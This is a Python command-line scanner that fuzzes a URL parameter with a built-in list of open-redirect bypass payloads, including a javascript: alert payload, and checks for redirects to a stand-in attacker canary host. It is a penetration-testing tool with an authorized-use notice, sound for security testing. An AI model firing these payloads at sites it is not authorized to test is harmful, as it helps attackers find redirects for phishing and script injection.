#!/usr/bin/env python3
"""
Open Redirect Scanner
----------------------
Tests a URL parameter for open-redirect vulnerabilities by inserting a
list of bypass payloads and checking whether the response redirects
(3xx / Location header, or a meta-refresh / JS redirect) to an
attacker-controlled-looking host.

Intended for use ONLY against systems you own or are explicitly
authorized to test.

Usage:
    python redirect_scan.py --url "https://target.com/login?next=FUZZ"
    python redirect_scan.py --url "https://target.com/login?next=FUZZ" --payloads mine.txt
"""

import argparse
import re
import sys
from urllib.parse import urlparse

import requests

FUZZ_MARKER = "FUZZ"
CANARY_HOST = "evil-attacker-canary.com"

DEFAULT_PAYLOADS = [
    f"https://{CANARY_HOST}",
    f"http://{CANARY_HOST}",
    f"//{CANARY_HOST}",
    f"///{CANARY_HOST}",
    f"https:{CANARY_HOST}",
    f"/\\/\\{CANARY_HOST}",
    f"https://target.com.{CANARY_HOST}",       # subdomain confusion
    f"https://{CANARY_HOST}%2f%2e%2e",
    f"https://{CANARY_HOST}?.target.com",       # trailing trick
    f"javascript:alert(document.domain)//{CANARY_HOST}",
]

META_REFRESH_RE = re.compile(r'http-equiv=["\']refresh["\'][^>]*url=([^"\'>]+)', re.IGNORECASE)


def load_payloads(path):
    if not path:
        return list(DEFAULT_PAYLOADS)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except OSError as e:
        print(f"[!] Could not read payload file: {e}", file=sys.stderr)
        sys.exit(1)


def points_to_canary(location, canary_host):
    if not location:
        return False
    if canary_host in location:
        return True
    try:
        host = urlparse(location if "://" in location else f"//{location}").netloc
    except ValueError:
        return False
    return canary_host in host


def check_payload(session, url_template, payload, timeout):
    url = url_template.replace(FUZZ_MARKER, payload)
    try:
        resp = session.get(url, timeout=timeout, allow_redirects=False)
    except requests.RequestException as e:
        return {"payload": payload, "error": str(e)}

    result = {"payload": payload, "status": resp.status_code, "vulnerable": False, "via": None}

    location = resp.headers.get("Location")
    if resp.status_code in (301, 302, 303, 307, 308) and points_to_canary(location, CANARY_HOST):
        result["vulnerable"] = True
        result["via"] = f"Location header: {location}"
        return result

    if resp.status_code == 200 and "text/html" in resp.headers.get("Content-Type", ""):
        match = META_REFRESH_RE.search(resp.text)
        if match and CANARY_HOST in match.group(1):
            result["vulnerable"] = True
            result["via"] = f"meta-refresh: {match.group(1).strip()}"

    return result


def main():
    parser = argparse.ArgumentParser(description="Scan a URL parameter for open-redirect vulnerabilities.")
    parser.add_argument("--url", required=True, help=f"Target URL containing the {FUZZ_MARKER} marker")
    parser.add_argument("--payloads", help="Path to a custom payload wordlist (default: built-in bypass list)")
    parser.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout in seconds")
    args = parser.parse_args()

    if FUZZ_MARKER not in args.url:
        print(f"[!] --url must contain the {FUZZ_MARKER} marker, e.g. "
              f"https://target.com/login?next={FUZZ_MARKER}", file=sys.stderr)
        sys.exit(1)

    payloads = load_payloads(args.payloads)
    print(f"[*] Target: {args.url}")
    print(f"[*] Testing {len(payloads)} payloads (canary host: {CANARY_HOST})")
    print("-" * 60)

    found_any = False
    with requests.Session() as session:
        for payload in payloads:
            r = check_payload(session, args.url, payload, args.timeout)
            if r.get("error"):
                print(f"[ERR ] {payload:<45} {r['error']}")
                continue
            if r["vulnerable"]:
                found_any = True
                print(f"[VULN] {payload:<45} -> {r['via']}")
            else:
                print(f"[ OK ] {payload:<45} status={r['status']}")

    print("-" * 60)
    if found_any:
        print("[!] Open redirect confirmed on at least one payload — review [VULN] lines above.")
    else:
        print("[*] No open redirect detected with this payload set.")


if __name__ == "__main__":
    main()
